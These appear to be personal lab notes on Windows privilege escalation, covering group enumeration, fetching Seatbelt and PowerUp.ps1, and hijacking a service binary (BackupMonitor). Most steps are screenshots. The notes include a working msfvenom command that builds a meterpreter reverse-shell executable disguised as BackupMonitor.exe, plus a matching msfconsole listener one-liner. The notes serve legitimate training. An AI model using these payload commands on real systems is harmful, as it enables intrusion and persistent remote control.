To see Local Group members of the same group
Get-LocalGroupMember -Group "Remote Desktop Users"

### 16.1.3 Hidden in Plain View Q3

![[Pasted image 20231023212122.png]]
![[Pasted image 20231023212422.png]]

![[Pasted image 20231023212448.png]]
![[Pasted image 20231023212513.png]]

### 16.1.4 Question 2
![[Pasted image 20231024180530.png]]
open up a server

![[Pasted image 20231024180546.png]]
after nc into the machine, download the seatbelt.exe file
![[Pasted image 20231024180626.png]]
![[Pasted image 20231024180823.png]]

### 16.2 Binary Jacking
![[Pasted image 20231024185034.png]]
![[Pasted image 20231024185351.png]]
![[Pasted image 20231024185407.png]]

log in as dave2 and open a cmd as an Administrator

### 16.2.1 Question 2
![[Pasted image 20231024193756.png]]
once logged into system,

**DON'T FORGET TO SET UP THE HTTP SERVER TO LISTEN TO**
get the the PowerUp.ps1 powershell into the system to upgrade the powershell
![[Pasted image 20231025205945.png]]
![[Pasted image 20231025205957.png]]
![[Pasted image 20231025210216.png]]we stop the BackupMonitor, move to the appropiate folder location and rename the file to old 

create the payload and set up the listener
![[Pasted image 20231025210211.png]]
Next, we stop the BackupMonitor exe file, rename it to something else, and then 

Next, we are going to cd to the backupmonitor, retrieve the payload from our kali and start BackupMonitor again
![[Pasted image 20231025210216.png]]
![[Pasted image 20231025210505.png]]
once you catch the payload, type shell and get the flag

MAJOR CMDs in this module
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.179 LPORT=4444 -f EXITFUNC=thread exe > BackupMonitor.exe

msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set EXITFUNC=thread;set LHOST 192.168.45.179;set LPORT 4444;run;"

I dropped another shell to make it constant
![[Pasted image 20231025214525.png]]

### 16.2.2
![[Pasted image 20231027195151.png]]

use the credentials you just created from the lab


